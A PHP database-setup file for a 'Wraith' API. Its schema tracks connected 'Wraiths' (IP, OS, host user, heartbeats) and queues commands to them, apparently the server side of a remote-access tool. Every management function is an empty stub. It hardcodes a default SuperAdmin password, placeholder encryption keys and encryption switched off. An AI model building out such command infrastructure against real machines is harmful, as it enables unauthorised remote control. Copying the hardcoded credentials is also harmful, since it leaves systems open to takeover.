<?php

// SQLite database file location relative to API.php
$DATABASE_LOCATION = "./storage/wraithdb";

// Get a database instance
// This can be edited to use MySQL or equivalent databases. As long as
// there is a $db variable holding a PDO database connection
// all should work (untested).
$db = new PDO("sqlite:" . $DATABASE_LOCATION);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Check whether the database is initialised
try {

    $db->query("SELECT * FROM DB_INIT_INDICATOR")->fetchAll();

} catch (PDOException $e) {

    // If not, prepare the database

    // SQL Commands to be executed to initialise the database
    $db_init_commands = [
        // Settings table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Settings` (
            `WraithMarkOfflineDelaySeconds` INTEGER,
            `WraithInitialCryptKey` TEXT,
            `WraithSwitchCryptKey` TEXT,
            `APIFingerprint` TEXT,
            `DefaultCommand` TEXT,
            `APIPrefix` TEXT,
            `RequestIPBlacklist` TEXT,
            `NoEncrypt` INTEGER
        );",
        // Statistics table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Stats` (
            `DatabaseSetupTime` INTEGER,
            `LifetimeWraithConnections` INTEGER,
            `CurrentActiveWraiths` INTEGER,
            `MostRecentWraithLogin` TEXT,
            `WraithUploads` INTEGER,
            `CommandsIssued` INTEGER,
            `CommandsExecuted` INTEGER
        );",
        // Connected Wraiths table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_ActiveWraiths` (
            `AssignedID` TEXT NOT NULL UNIQUE,
            `Fingerprint` TEXT,
            `ReportedIP` TEXT,
            `ConnectingIP` TEXT,
            `OSType` TEXT,
            `SystemName` TEXT,
            `HostUserName` TEXT,
            `WraithVersion` TEXT,
            `HeartbeatsReceived` INTEGER,
            `LastHeartbeatTime` INTEGER NOT NULL,
            `IssuedCommands` TEXT
        );",
        // Command queue table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_CommandsIssued` (
            `CommandID` TEXT NOT NULL UNIQUE,
            `CommandName` TEXT,
            `CommandParams` TEXT,
            `CommandTargets` TEXT,
            `CommandResponses` TEXT,
            `TimeIssued` INTEGER
        );",
        // Users table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Users` (
            `UserID` INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
            `UserName` TEXT NOT NULL UNIQUE,
            `UserPassword` TEXT,
            `UserPrivileges` INTEGER
        );",
        // Initialisation marker
        "CREATE TABLE IF NOT EXISTS `DB_INIT_INDICATOR` (
            `DB_INIT_INDICATOR` INTEGER
        );",
        // Create a stats table entry
        "INSERT INTO `WraithAPI_Stats` (
            `DatabaseSetupTime`
        ) VALUES (
            '" . time() . "'
        );"
    ];

    // Execute the SQL queries to initialise the database
    foreach ($db_init_commands as $command) {

        $db->exec($command);

    }

}

// Check whether a settings entry exists
try {

    // Get the first row of the settings table
    $SETTINGS = $db->query("SELECT * FROM WraithAPI_Settings LIMIT 1")->fetchAll();

    // The row is returned within another array by fetchAll(). If the length of
    // that array is 0, there are no rows so raise an exception to create one
    if (sizeof($SETTINGS) == 0) { throw new Exception(""); }

} catch (Exception $e) {

    // Create default settings entry if not

    $settings_entry_creation_command = "INSERT INTO `WraithAPI_Settings` VALUES (
        '20',
        'QWERTYUIOPASDFGHJKLZXCVBNM',
        'QWERTYUIOPASDFGHJKLZXCVBNM_switch',
        'ABCDEFGHIJKLMNOP',
        '',
        'W_',
        '[]',
        '1'
    );"; // TODO: Change NoEncrypt default to 0 for release

    $db->exec($settings_entry_creation_command);

}

// Set the global SETTINGS variable
$SETTINGS = $db->query("SELECT * FROM WraithAPI_Settings LIMIT 1")->fetchAll()[0];

// Check whether a user account exists
// There has to be a way to manage the API so if there are no users,
// create one.
try {

    $API_USERS = $db->query("SELECT * FROM WraithAPI_Users")->fetchAll();

    if (sizeof($API_USERS) == 0) {
        throw new Exception("");
    }

} catch (Exception $e) {

    // Create default super admin user

    $user_entry_creation_command = "INSERT INTO `WraithAPI_Users` (
        `UserName`,
        `UserPassword`,
        `UserPrivileges`
    ) VALUES (
        'SuperAdmin',
        '" . password_hash("SuperAdminPassword", PASSWORD_BCRYPT) . "',
        '2'
    );";

    $db->exec($user_entry_creation_command);

}

// Set the global API_USERS variable
$API_USERS = $db->query("SELECT * FROM WraithAPI_Users LIMIT 1")->fetchAll();

// Functions for database management

// WRAITH

// Add a Wraith to the database
function db_add_wraiths($data) {

    // TODO

}

// Remove a Wraith
function db_remove_wraiths($filters) {

    // TODO

}

// Check which Wraiths have not sent a heartbeat in the mark dead time and remove
// them from the database
function db_expire_wraiths() {

    // TODO

}

// Get a list of Wraiths and their properties
function db_get_wraiths($filters) {

    // TODO

}

// COMMAND

// Issue a command to Wraith(s)
function db_issue_commands($data) {

    // TODO

}

// Delete a command from the command table
function db_cancel_commands($filters) {

    // TODO

}

// Get commands (all or filtered)
function db_get_commands($filters) {

    // TODO

}

// USERS & SETTINGS

// Edit an API setting
function db_edit_settings($data) {

    // TODO

}

// Create a new user
function db_add_users($data) {

    // TODO

}

// Change username
function db_change_user_name($data) {

    // TODO

}

// Change user password
function db_change_user_pass($data) {

    // TODO

}

// Change user privilege level (0=User, 1=Admin, 2=SuperAdmin)
function db_change_user_privilege($data) {

    // TODO

}

// STATS

// Update a statistic
function db_update_stats($data) {

    // TODO

}
